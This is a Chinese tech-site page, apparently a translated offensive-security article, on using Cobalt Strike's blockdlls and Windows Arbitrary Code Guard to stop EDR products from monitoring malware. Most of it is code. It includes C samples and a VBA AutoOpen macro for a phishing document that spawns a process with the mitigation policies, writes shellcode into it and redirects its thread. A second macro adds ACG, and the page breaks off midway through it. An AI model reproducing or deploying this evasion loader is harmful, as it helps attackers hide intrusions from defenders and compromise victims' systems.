<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ | æå®¢å¿«è¨Š</title><meta property="og:title" content="å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/8a7e234.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/8a7e234.html><meta property="article:published_time" content="2020-10-29T21:08:07+08:00"><meta property="article:modified_time" content="2020-10-29T21:08:07+08:00"><meta name=Keywords content><meta name=description content="å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/8a7e234.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è¨Š Geek Bank</a></h1><p class=description>ç‚ºä½ å¸¶ä¾†æœ€å…¨çš„ç§‘æŠ€çŸ¥è­˜ ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><div><p>åœ¨Cobalt Strikeçš„è¿‘æœŸæ›´æ–°ä¸­ï¼ŒåŠ å…¥äº†blockdllså‘½ä»¤ï¼Œå®ƒå¯åœ¨æ”»æ“Šè€…æ´¾ç”Ÿå­é€²ç¨‹æ™‚é˜»æ­¢ç¬¬ä¸‰æ–¹DLLçš„åŠ è¼‰ã€‚é€™å°±ä½¿å®‰å…¨ç”¢å“åœ¨é€²ç¨‹å‰µå»ºæ™‚ç„¡æ³•é€šéDLLåŠ è¼‰é€²è¡Œç›£æ§å’Œå¯ç–‘æƒ…æ³ä¸Šå ±ã€‚</p><p>åœ¨é€²è¡Œéå¹¾æ¬¡å…§éƒ¨åŸç†çš„è¨è«–å¾Œï¼Œæˆ‘è¦ºå¾—æœ‰å¿…è¦å¯«ä¸€ç¯‡æ–‡ç« å±•ç¤ºå…¶ç”¨æ³•å’ŒèƒŒå¾Œçš„åŸç†ï¼Œå¦‚ä½•ç”¨å®ƒä¾†ä¿è­·æˆ‘å€‘çš„æƒ¡æ„è»Ÿä»¶ï¼Œé˜»æ­¢å®‰å…¨è»Ÿä»¶çš„ç›£æ§ã€‚</p><h1>blockdlls</h1><p>blockdllsæ˜¯åœ¨Cobalt Strikeçš„3.14ç‰ˆæœ¬ä¸­å‡ºç¾çš„ï¼Œç”¨æ–¼ä¿è­·æ´¾ç”Ÿçš„å­é€²ç¨‹ä¸å—ç¬¬ä¸‰æ–¹DLLçš„å¹²æ“¾ã€‚ä½¿ç”¨é€™å€‹åŠŸèƒ½å¾ˆç°¡å–®ï¼Œæˆ‘å€‘åªéœ€åœ¨ä¸€å€‹æ´»å‹•çš„æœƒè©±ä¸­ä½¿ç”¨blockdllså‘½ä»¤ï¼Œç„¶å¾Œæ´¾ç”Ÿä¸€å€‹å­é€²ç¨‹ï¼ˆä½¿ç”¨spawnå‘½ä»¤ï¼‰ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/18a6236e237648dcbd6f77ca0904c065><p class=pgc-img-caption></p></div><p>ä¸€æ—¦æˆ‘å€‘çš„å­é€²ç¨‹å‡ºç¾ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ProcessHackerä¸­çœ‹åˆ°é¡ä¼¼èªå¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d8c2ff4b8c7c41cda836e41d40568560><p class=pgc-img-caption></p></div><p>æ­¤æ™‚å¦‚æœä¸€å€‹æ²’æœ‰è¢«å¾®è»Ÿç°½åçš„DLLè©¦åœ–åŠ è¼‰åˆ°é€²ç¨‹ä¸­ï¼Œå°±æœƒå‡ºç¾ä¸€å€‹å¾ˆè©³ç´°çš„éŒ¯èª¤ï¼Œä¾‹å¦‚ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f29493fb053a4347b0efd5a1f08a10c6><p class=pgc-img-caption></p></div><p>é‚£éº¼ï¼ŒCobalt Strikeæ˜¯å¦‚ä½•å¯¦ç¾é€™ä¸€åŠŸèƒ½çš„å‘¢ï¼Ÿå¦‚æœæˆ‘å€‘æœç´¢CS beaconçš„äºŒé€²åˆ¶æ–‡ä»¶ï¼Œä½ æœƒçœ‹åˆ°å°UpdateProcThreadAttributeçš„å¼•ç”¨ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/058beecd2b3947208a5dfc093d0d0413><p class=pgc-img-caption></p></div><p>ä¸Šåœ–ä¸­ï¼Œ0x20007çš„Attributeåƒæ•¸å¯¦éš›ä¸Šå’ŒPROC_THREAD_ATTRIBUTE_MITIGATION_POLICYæœ‰é—œï¼Œè€Œ0x100000000000çš„å€¼è§£æç‚ºPROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONã€‚å¯ä»¥çœ‹å‡ºï¼ŒCobalt Strikeèª¿ç”¨äº†CreateProcessAPIï¼Œå…¶ä¸­æ¶‰åŠä¸€å€‹STARTUPINFOEXçµæ§‹é«”ï¼Œè©²çµæ§‹é«”åŒ…å«ä¸€å€‹å®‰å…¨ç­–ç•¥ï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œè©²ç­–ç•¥é˜»æ­¢äº†éå¾®è»Ÿç°½åçš„DLLåŠ è¼‰ã€‚</p><p>å¦‚æœæˆ‘å€‘æƒ³è‡ªå·±é‡ç¾ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹ä»£ç¢¼ï¼š</p><pre>#include &lt;Windows.h&gt;int main(){ STARTUPINFOEXA si; PROCESS_INFORMATION pi; SIZE_T size = 0; BOOL ret; // Required for a STARTUPINFOEXA ZeroMemory(&amp;si, sizeof(si)); si.StartupInfo.cb = sizeof(STARTUPINFOEXA); si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT; // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size); // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc( GetProcessHeap(), 0, size ); // Initialise our list  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size); // Enable blocking of non-Microsoft signed DLLs DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON; // Assign our attribute UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, sizeof(policy), NULL, NULL); // Finally, create the process ret = CreateProcessA( NULL, (LPSTR)"C:\\Windows\\System32\\cmd.exe", NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), &amp;pi );}</pre><h1>é€²ä¸€æ­¥ç­è§£</h1><p>ç¾åœ¨æˆ‘å€‘çŸ¥é“äº†Cobalt Strikeå¦‚ä½•å¯¦ç¾è©²åŠŸèƒ½ï¼Œä½†åœ¨æ»²é€çš„æŸäº›éšæ®µé€™å€‹åŠŸèƒ½ä¸¦ä¸èƒ½è¦†è“‹ï¼Œé€™å°±çµ¦äº†å®‰å…¨è»Ÿä»¶å¯ä¹˜ä¹‹æ©Ÿã€‚è®“æˆ‘å€‘çœ‹çœ‹ä¸€å€‹å¸¸è¦‹çš„é‡£é­šå ´æ™¯ï¼Œæˆ‘å€‘è©¦åœ–é€šéä¸€å€‹åŒ…å«æƒ¡æ„å®çš„æ–‡æª”ä¾†é€²è¡Œbeaconæ¤å…¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ca04a0eb32ed4a3b9ee097335872396f><p class=pgc-img-caption></p></div><p>ä¸€èˆ¬å…¥ä¾µæµç¨‹ä¸­ï¼Œåœ¨ä¸Šåœ–ç´…è‰²æ–¹æ¡†çš„éƒ¨åˆ†ï¼Œblockdllsç„¡æ³•ç”Ÿæ•ˆï¼Œä½†åœ¨è—è‰²æ–¹æ¡†ä¸­ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°ç”±Cobalt Strikeæ‰€æ´¾ç”Ÿçš„æ¯å€‹å­é€²ç¨‹éƒ½å—åˆ°äº†â€œå®‰å…¨â€ç­–ç•¥çš„ä¿è­·ã€‚é€™è£¡æ‰€é¢è‡¨çš„é¢¨éšªæ˜¯å®‰å…¨ç”¢å“æœƒå°‡å…¶DLLåŠ è¼‰åˆ°é·ç§»é€²ç¨‹ï¼ˆé€™è£¡é¡¯ç¤ºç‚ºInternet Explorerï¼‰ï¼Œæª¢æŸ¥å…¶ä¸­æ˜¯å¦æœ‰æƒ¡æ„æ´»å‹•ã€‚</p><p>ä¸éï¼Œçµåˆä¸Šè¿°ä»£ç¢¼å’ŒPROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONé¸é …ï¼Œæˆ‘å€‘å¯ä»¥è¼ƒå¥½åœ°è§£æ±ºé€™å€‹å•é¡Œã€‚</p><pre>POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare Function SetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) As LongPrivate Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _ ByVal hHeap As LongPtr, _ ByVal dwFlags As Long, _ ByVal dwBytes As Long _) As LongPtrPrivate Declare PtrSafe Function GetProcessHeap Lib "kernel32.dll" () As LongPtrPrivate Declare Function VirtualAllocEx Lib "kernel32" ( _ ByVal hProcess As Long, _ ByVal lpAddress As Long, _ ByVal dwSize As Long, _ ByVal flAllocationType As Long, _ ByVal flProtect As Long _) As LongSub AutoOpen() Dim pi As PROCESS_INFORMATION Dim si As STARTUPINFOEX Dim nullStr As String Dim pid, result As Integer Dim threadAttribSize As Integer Dim processPath As String Dim val As DWORD64 Dim ctx As CONTEXT Dim alloc As Long Dim shellcode As Variant Dim myByte As Long ' Shellcode goes here (jmp $) shellcode = Array(&amp;HEB, &amp;HFE) ' Path of process to spawn processPath = "C:\\windows\\system32\\notepad.exe" ' Specifies PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON val.dwPart1 = 0 val.dwPart2 = &amp;H1000 ' Initialize process attribute list result = InitializeProcThreadAttributeList(ByVal 0&amp;, 1, 0, threadAttribSize) si.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize) result = InitializeProcThreadAttributeList(si.lpAttributelist, 1, 0, threadAttribSize) ' Set our mitigation policy result = UpdateProcThreadAttribute( _ si.lpAttributelist, _ 0, _ PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, _ VarPtr(val), _ Len(val), _ ByVal 0&amp;, _ ByVal 0&amp; _ ) si.STARTUPINFO.cb = LenB(si) si.STARTUPINFO.dwFlags = 1 ' Spawn our process which will only allow MS signed DLL's result = CreateProcess( _ nullStr, _ processPath, _ ByVal 0&amp;, _ ByVal 0&amp;, _ 1&amp;, _ &amp;H80014, _ ByVal 0&amp;, _ nullStr, _ VarPtr(si), _ pi _ ) ' Alloc memory (RWX for this POC, because... yolo) in process to write our shellcode to alloc = VirtualAllocEx( _ pi.hProcess, _ 0, _ 11000, _ MEM_COMMIT + MEM_RESERVE, _ PAGE_EXECUTE_READWRITE _ ) ' Write our shellcode For offset = LBound(shellcode) To UBound(shellcode) myByte = shellcode(offset) result = WriteProcessMemory(pi.hProcess, alloc + offset, myByte, 1, ByVal 0&amp;) Next offset ' Point EIP register to allocated memory ctx.ContextFlags = CONTEXT_FULL result = GetThreadContext(pi.hThread, ctx) ctx.Eip = alloc result = SetThreadContext(pi.hThread, ctx) ' Resume execution ResumeThread (pi.hThread)End Sub</pre><p>å¦‚æœä½¿ç”¨æ­£ç¢ºï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°å®‰å…¨è»Ÿä»¶æ‰€èƒ½æª¢æ¸¬çš„éšæ®µæ¸›å°‘äº†ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/3b4d25abb195478c9af753145099710e><p class=pgc-img-caption></p></div><p>é‚£éº¼å‰©ä¸‹çš„ç´…è‰²éšæ®µå‘¢ï¼Ÿä¹Ÿé‚„æ˜¯æœ‰ä¸€äº›æ–¹æ³•å¯ä»¥é€²è¡Œä¿è­·ï¼Œä¾‹å¦‚ï¼Œæˆ‘å€‘å¯ä»¥èª¿ç”¨å«æœ‰åƒæ•¸ProcessSignaturePolicyçš„SetMitigationPolicyï¼Œé€™ä¹Ÿå¯ä»¥åœ¨é‹è¡Œæ™‚å¼•å…¥ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œä¸éœ€è¦é€šéCreateProcessé‡æ–°åŸ·è¡Œã€‚ç„¶è€Œï¼Œå¾ˆå¯èƒ½åœ¨VBAæ–‡ä»¶é‹è¡Œä¹‹å‰ï¼ŒæŸäº›DLLå°±å·²ç¶“åŠ è¼‰åˆ°Wordçš„åœ°å€ç©ºé–“ä¸­äº†ï¼ŒæŸäº›å±éšªæ“ä½œæœƒå¢åŠ è¢«æª¢æ¸¬åˆ°çš„æ©Ÿæœƒã€‚</p><h1>ä»»æ„ä»£ç¢¼ä¿è­·</h1><p>åœ¨é–±è®€æœ¬æ–‡æ™‚ï¼Œä½ å¯èƒ½æ²’è½éä»»æ„ä»£ç¢¼ä¿è­·ï¼ˆACGï¼‰ã€‚é€™æ˜¯Windowsç³»çµ±çš„å¦ä¸€å€‹å®‰å…¨ç­–ç•¥ï¼Œå®ƒå¯ä»¥é˜»æ­¢å…§å­˜ä»£ç¢¼æ³¨å…¥ã€‚</p><p>è¦æŸ¥çœ‹é€™å€‹ç­–ç•¥çš„å¯¦éš›æ•ˆæœï¼Œå…ˆè®“æˆ‘å€‘å‰µå»ºä¸€å€‹å°ç¨‹åºï¼Œä¸¦å˜—è©¦ä½¿ç”¨SetMitigationPolicyæ·»åŠ ACGï¼š</p><pre>#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;int main(){ STARTUPINFOEX si; DWORD oldProtection; PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy; ZeroMemory(&amp;policy, sizeof(policy)); policy.ProhibitDynamicCode = 1; void* mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } printf("[*] Now running SetProcessMitigationPolicy to apply PROCESS_MITIGATION_DYNAMIC_CODE_POLICY\n"); // Set our mitigation policy if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &amp;policy, sizeof(policy)) == false) { printf("[!] SetProcessMitigationPolicy failed\n"); return 0; } // Attempt to allocate RWX protected memory (this will fail) mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (mem == NULL) { printf("[!] Error allocating RWX memory\n"); } else { printf("[*] RWX memory allocated: %p\n", mem); } void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory"); // Let's also try a VirtualProtect to see if we can update an existing page to RWX if (!VirtualProtect(ntAllocateVirtualMemory, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProtection)) { printf("[!] Error updating NtAllocateVirtualMemory [%p] memory to RWX\n", ntAllocateVirtualMemory); } else { printf("[*] NtAllocateVirtualMemory [%p] memory updated to RWX\n", ntAllocateVirtualMemory); }}</pre><p>ç·¨è­¯ä¸¦åŸ·è¡Œå¾Œï¼Œæˆ‘å€‘æœƒçœ‹åˆ°å¦‚ä¸‹èªå¥ï¼š</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/85ac869d8c6e4e1d88488b97a3599404><p class=pgc-img-caption></p></div><p>æˆ‘å€‘å¯ä»¥è§€å¯Ÿåˆ°åœ¨SetProcessMitigationPolicyåŸ·è¡Œå¾Œï¼Œåˆ†é…RWXå…§å­˜é å¤±æ•—äº†ã€‚</p><p>ç‚ºä»€éº¼è¦æèµ·é€™å€‹ï¼Ÿå› ç‚ºæˆ‘å€‘ç¢ºå¯¦çœ‹åˆ°äº†ä¸€äº›EDR DLLè¢«æ³¨å…¥çš„ä¾‹å­ï¼Œä¾‹å¦‚ï¼Œ@Sektor7Netå‘æˆ‘å€‘å±•ç¤ºäº†Crowdstrike Falconä¸­çš„æŸå€‹DLLï¼Œå®ƒä¸å—PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ONçš„å½±éŸ¿:</p><div class=pgc-img><img alt=å¦‚ä½•åˆ©ç”¨blockdllså’ŒACGä¿è­·ä½ çš„æƒ¡æ„è»Ÿä»¶ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ae2f5491a25b454d9e566308729de80a><p class=pgc-img-caption></p></div><p>ä½†æ˜¯ï¼Œå¾ˆå¤šEDRç”¢å“éƒ½æœƒåšçš„ä¸€ä»¶äº‹å°±æ˜¯æ ¹æ“šæŸäº›åŠŸèƒ½åœ¨ç”¨æˆ¶ç©ºé–“ä½ˆç½®hookï¼ˆç›¸é—œæ–‡ç« ï¼‰ã€‚ç”±æ–¼hooké€šå¸¸éœ€è¦ä¿®æ”¹ç¾æœ‰çš„å¯åŸ·è¡Œpageï¼Œæ·»åŠ Trampolineï¼Œæ‰€ä»¥é€šå¸¸éœ€è¦èª¿ç”¨VirtualProtectä¾†æ›´æ–°å…§å­˜ä¿è­·ã€‚å¦‚æœæˆ‘å€‘ç§»é™¤å®ƒå‰µå»ºRWXå…§å­˜é çš„èƒ½åŠ›ï¼Œå°±èƒ½è¿«ä½¿ä¸€å€‹Microsoftç°½åDLLåŠ è¼‰å¤±æ•—ã€‚</p><p>è¦åœ¨æˆ‘å€‘çš„VBAä»£ç¢¼ä¸­å¯¦ç¾é€™ä¸€é»ï¼Œæˆ‘å€‘éœ€è¦æ·»åŠ PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ONé¸é …ï¼Œå•Ÿç”¨é€™ç¨®ä¿è­·ï¼š</p><pre>' POC to spawn process with PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON and PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON mitigation enabled' by @_xpn_'' Thanks to https://github.com/itm4n/VBA-RunPE and https://github.com/christophetd/spoofing-office-macroConst EXTENDED_STARTUPINFO_PRESENT = &amp;H80000Const HEAP_ZERO_MEMORY = &amp;H8&amp;Const SW_HIDE = &amp;H0&amp;Const MAX_PATH = 260Const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = &amp;H20007Const MAXIMUM_SUPPORTED_EXTENSION = 512Const SIZE_OF_80387_REGISTERS = 80Const MEM_COMMIT = &amp;H1000Const MEM_RESERVE = &amp;H2000Const PAGE_READWRITE = &amp;H4Const PAGE_EXECUTE_READWRITE = &amp;H40Const CONTEXT_FULL = &amp;H10007Private Type PROCESS_INFORMATION hProcess As LongPtr hThread As LongPtr dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUP_INFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Byte hStdInput As LongPtr hStdOutput As LongPtr hStdError As LongPtrEnd TypePrivate Type STARTUPINFOEX STARTUPINFO As STARTUP_INFO lpAttributelist As LongPtrEnd TypePrivate Type DWORD64 dwPart1 As Long dwPart2 As LongEnd TypePrivate Type FLOATING_SAVE_AREA ControlWord As Long StatusWord As Long TagWord As Long ErrorOffset As Long ErrorSelector As Long DataOffset As Long DataSelector As Long RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte Spare0 As LongEnd TypePrivate Type CONTEXT ContextFlags As Long Dr0 As Long Dr1 As Long Dr2 As Long Dr3 As Long Dr6 As Long Dr7 As Long FloatSave As FLOATING_SAVE_AREA SegGs As Long SegFs As Long SegEs As Long SegDs As Long Edi As Long Esi As Long Ebx As Long Edx As Long Ecx As Long Eax As Long Ebp As Long Eip As Long SegCs As Long EFlags As Long Esp As Long SegSs As Long ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As ByteEnd TypePrivate Declare PtrSafe Function CreateProcess Lib "kernel32.dll" Alias "CreateProcessA" ( _ ByVal lpApplicationName As String, _ ByVal lpCommandLine As String, _ lpProcessAttributes As Long, _ lpThreadAttributes As Long, _ ByVal bInheritHandles As Long, _ ByVal dwCreationFlags As Long, _ lpEnvironment As Any, _ ByVal lpCurrentDriectory As String, _ ByVal lpStartupInfo As LongPtr, _ lpProcessInformation As PROCESS_INFORMATION _) As LongPrivate Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwAttributeCount As Integer, _ ByVal dwFlags As Integer, _ ByRef lpSize As Integer _) As BooleanPrivate Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32.dll" ( _ ByVal lpAttributelist As LongPtr, _ ByVal dwFlags As Integer, _ ByVal lpAttribute As Long, _ ByVal lpValue As LongPtr, _ ByVal cbSize As Integer, _ ByRef lpPreviousValue As Integer, _ ByRef lpReturnSize As Integer _) As BooleanPrivate Declare Function WriteProcessMemory Lib "kernel32.dll" ( _ ByVal hProcess As LongPtr, _ ByVal lpba seAddress As Long, _ ByRef lpBuffer As Any, _ ByVal nSize As Long, _ ByVal lpNumberOfBytesWritten As Long _) As BooleanPrivate Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As LongPtr) As LongPrivate Declare PtrSafe Function GetThreadContext Lib "kernel32.dll" ( _ ByVal hThread As Long, _ lpContext As CONTEXT _) 